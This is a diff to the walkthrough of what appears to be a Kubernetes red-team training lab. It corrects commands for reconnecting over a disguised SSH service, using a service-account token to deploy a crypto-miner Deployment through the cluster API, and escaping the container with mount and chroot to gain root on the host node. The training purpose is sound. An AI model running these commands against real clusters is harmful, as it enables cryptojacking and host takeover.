@@ -23,7 +23,8 @@ __Red__ reconnects to the cluster using the SSH service disguised as a *metrics-
 
 Connect to the cluster via SSH:
 ```console
-echo "Sup3r_S3cr3t_P@ssw0rd" > ssh root@<service IP from attack 1>:8080
+echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
+ssh root@<service IP from attack 1> -p 8080
 ```
 
 To restart our crypto mining, we will need the token for the pod service account:
@@ -41,9 +42,14 @@ And we will be connecting to the kubernetes API from inside the cluster this tim
 export API_SERVER="https://kubernetes.default.svc"
 ```
 
+Lastly, we will need curl for this and our SSH image didn't come with it preinstalled:
+```console
+apk update && apk add curl
+```
+
 Now the fun part, let's create our miner:
 ```console
-curl -k -X POST "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data-binary '{"apiVersion":"apps/v1","kind":"Deployment","metadata":{"labels":{"run":"bitcoinero"},"name":"bitcoinero","namespace":"dev"},"spec":{"replicas":1,"revisionHistoryLimit":2,"selector":{"matchLabels":{"run":"bitcoinero"}},"strategy":{"rollingUpdate":{"maxSurge":"25%","maxUnavailable":"25%"},"type":"RollingUpdate"},"template":{"metadata":{"labels":{"run":"bitcoinero"}},"spec":{"containers":[{"image":"securekubernetes/bitcoinero:latest","name":"bitcoinero","command":["./moneymoneymoney"],"args":["-c","1","-l","10"],"resources":{"requests":{"cpu":"100m","memory":"128Mi"},"limits":{"cpu":"200m","memory":"128Mi"}}}]}}}}'
+curl -k -X POST "$API_SERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data-binary '{"apiVersion":"apps/v1","kind":"Deployment","metadata":{"labels":{"run":"bitcoinero"},"name":"bitcoinero","namespace":"'$NAMESPACE'"},"spec":{"replicas":1,"revisionHistoryLimit":2,"selector":{"matchLabels":{"run":"bitcoinero"}},"strategy":{"rollingUpdate":{"maxSurge":"25%","maxUnavailable":"25%"},"type":"RollingUpdate"},"template":{"metadata":{"labels":{"run":"bitcoinero"}},"spec":{"containers":[{"image":"securekubernetes/bitcoinero:latest","name":"bitcoinero","command":["./moneymoneymoney"],"args":["-c","1","-l","10"],"resources":{"requests":{"cpu":"100m","memory":"128Mi"},"limits":{"cpu":"200m","memory":"128Mi"}}}]}}}}'
 ```
 
 Verify that the pod is running:
@@ -59,7 +65,7 @@ To get started we need to escape the container and gain access to the host OS:
 ```console
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
-chroot /mnt/hola
+chroot /mnt/hola /bin/bash
 ```
 And just like that you are now root on the host node!
 
